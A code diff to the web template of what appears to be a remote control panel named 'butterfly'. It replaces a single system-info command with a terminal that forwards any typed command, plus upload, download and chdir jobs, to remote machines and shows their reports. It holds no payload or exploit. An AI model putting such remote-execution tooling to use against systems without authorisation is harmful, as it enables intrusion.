@@ -51,27 +51,37 @@
                 createUploadsTable();
             });
             $('#terminal-tab').one('click', function () {
-                $('#terminal-body').terminal({                          // TODO: export to global variable!
-                    sysinfo: function () {
-                        var term = this;
-                        term.pause()
-                        createJobApi({todo: 'cmd systeminfo', is_done: false}, job => {
-                            retrieveReport(job.id, rep => {
-                                term.echo(rep);
-                                term.resume();
-                            }, () => {
-                                term.error('Failed to retrieve report!');
-                                term.resume();
+                terminal = $('#terminal-body').terminal(function (command) {
+                        terminal.pause();
+                        if (command === '') {
+                            return;
+                        }
+                        const jobTypes = ['upload', 'download', 'chdir'];
+                        let job = {todo: '', is_done: false};
+                        if (jobTypes.some(t => command.startsWith(t))) {
+                            job.todo = command
+                        } else {
+                            job.todo = 'cmd ' + command
+                        }
+                        createJobApi(job, function (res) {
+                            retrieveReport(res.id, rep => {
+                                terminal.echo(rep);
+                                terminal.resume();
+                            }, function () {
+                                terminal.error('Failed to retrieve report!');
+                                terminal.resume();
                             });
                             addJobToTable(job);
+                        }, function () {
+                            terminal.error('Failed to create job!');
+                            terminal.resume();
                         });
-                    }       // TODO: if boost command called, call setBoostStatus(val)
-                }, {
+                    }, {
                     greetings: 'Welcome to butterfly!',
                     height: 600
                 });
             });
-            $('.active-tab').trigger('click');      // TODO: call active tab funcs without one()
+            $('.active-tab').trigger('click');
         });
     </script>
 {{end}}
